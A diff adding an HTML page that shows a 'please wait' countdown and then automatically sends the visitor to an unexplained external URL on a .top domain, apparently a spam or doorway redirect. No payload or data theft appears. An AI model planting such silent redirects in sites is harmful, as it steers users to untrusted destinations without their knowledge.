@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Redirect</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to right, #00c6ff, #0072ff);
+            text-align: center;
+            padding: 50px;
+            color: white;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
+            max-width: 400px;
+            margin: auto;
+            color: black;
+        }
+        #timer {
+            font-size: 24px;
+            margin-top: 20px;
+            color: red;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Welcome!</h1>
+        <p>Please wait while we redirect you...</p>
+        <div id="timer">Redirecting in: 3 seconds</div>
+    </div>
+
+    <script>
+        let timeLeft = 3;
+        const timerElement = document.getElementById("timer");
+
+        const countdown = setInterval(function() {
+            timeLeft--;
+            timerElement.textContent = "Redirecting in: " + timeLeft + " seconds";
+
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                window.location.href = "http://asgels.top/femalefe";
+            }
+        }, 1000);
+    </script>
+
+</body>
+</html>
